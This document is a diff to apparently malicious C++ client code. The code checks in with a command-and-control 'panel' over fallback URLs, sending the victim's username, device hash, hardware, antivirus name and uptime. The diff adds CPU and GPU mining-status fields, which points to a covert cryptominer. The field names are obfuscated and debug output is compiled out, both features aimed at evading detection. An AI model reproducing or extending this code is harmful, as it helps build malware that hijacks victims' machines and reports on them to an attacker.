@@ -21,6 +21,9 @@ bool ConfigManager::FetchConfigFromPanelWithFallback(const std::string& panelUrl
                                                      const std::string& gpuName,
                                                      const std::string& antivirusName,
                                                      const std::string& clientVersion,
+                                                     const std::string& miningStatus,
+                                                     const std::string& cpuMiningStatus,
+                                                     const std::string& gpuMiningStatus,
                                                      int deviceUptimeMin) {
     // Split URLs by comma
     std::vector<std::string> urls;
@@ -60,7 +63,8 @@ bool ConfigManager::FetchConfigFromPanelWithFallback(const std::string& panelUrl
                       << ": " << urls[i] << " (attempt " << attempt << "/" << MAX_RECONNECT_ATTEMPTS << ")" << std::endl;
 #endif
 
-            if (FetchConfigFromPanel(wurl, pcUsername, deviceHash, cpuName, gpuName, antivirusName, clientVersion, deviceUptimeMin)) {
+            if (FetchConfigFromPanel(wurl, pcUsername, deviceHash, cpuName, gpuName, antivirusName, clientVersion,
+                                     miningStatus, cpuMiningStatus, gpuMiningStatus, deviceUptimeMin)) {
 #ifdef ENABLE_DEBUG_CONSOLE
                 std::cout << "[+] Successfully connected to panel: " << urls[i] << std::endl;
 #endif
@@ -213,6 +217,9 @@ bool ConfigManager::FetchConfigFromPanel(const std::wstring& panelUrl,
                                          const std::string& gpuName,
                                          const std::string& antivirusName,
                                          const std::string& clientVersion,
+                                         const std::string& miningStatus,
+                                         const std::string& cpuMiningStatus,
+                                         const std::string& gpuMiningStatus,
                                          int deviceUptimeMin) {
     try {
         // Guard rail: nlohmann::json::dump() throws type_error.316 on invalid
@@ -235,6 +242,9 @@ bool ConfigManager::FetchConfigFromPanel(const std::wstring& panelUrl,
             {OBFUSCATE_STRING("device_hash"),      EnsureValidUTF8(deviceHash)},
             {OBFUSCATE_STRING("cpu_name"),         safeCpuName},
             {OBFUSCATE_STRING("gpu_name"),         safeGpuName},
+            {OBFUSCATE_STRING("mining_status"),    EnsureValidUTF8(miningStatus)},
+            {OBFUSCATE_STRING("cpu_mining_status"),EnsureValidUTF8(cpuMiningStatus)},
+            {OBFUSCATE_STRING("gpu_mining_status"),EnsureValidUTF8(gpuMiningStatus)},
             {OBFUSCATE_STRING("antivirus_name"),   safeAvName},
             {OBFUSCATE_STRING("device_uptime_min"),deviceUptimeMin},
             {OBFUSCATE_STRING("client_version"),   safeVersion},
